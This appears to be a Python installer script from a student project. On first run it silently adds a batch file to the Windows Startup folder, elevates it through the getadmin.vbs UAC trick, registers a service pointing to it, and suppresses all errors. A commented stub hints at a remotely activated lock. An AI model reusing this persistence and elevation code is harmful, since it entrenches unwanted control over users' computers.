"""
when client download the software, this is the first commands to be executed
it connects to the website and get the message and the activation
"""
from Client.assisting import *
from pathlib import Path
from finals import *
import subprocess


prog_call = Path(__file__).absolute()
prog_call = r'%s' % str(prog_call).replace('\\', '/')
prog_location = os.path.split(prog_call)[0]
f = r"C:\Users\Cyber40Admin\PycharmProjects\FinalProject"


def add_to_startup(file_path=""):
    if file_path == "":
        file_path = prog_call
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % final.UN
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write('''@echo off
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
cmd /k "cd /d ''' + f + '''/venv/Scripts & activate & cd /d    ''' + prog_location + ''' & python projectClientFinal.py"''')


def makeService():
    subprocess.call("start uac.bat")
    p = r"sc create 'Test' start= demand displayname= 'Test2' binpath= 'C:\Users\Cyber40Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\open.bat'"
    subprocess.call(p)


try:
    makeService()
    add_to_startup()
    create_vars_folder()
    create_var(final.active_field, 0)
    createDesktopFolder()
    popup()



except:
    pass


"""
activation = r.text
message = rm.text
print(activation)
shelf[Finals.messageField] = str(message)
if activation == "0":
    shelf[Finals.activeField] = 0
elif activation == "1":
    shelf[Finals.activeField] = 1
    # TODO START THE LOCK COMMAND
"""
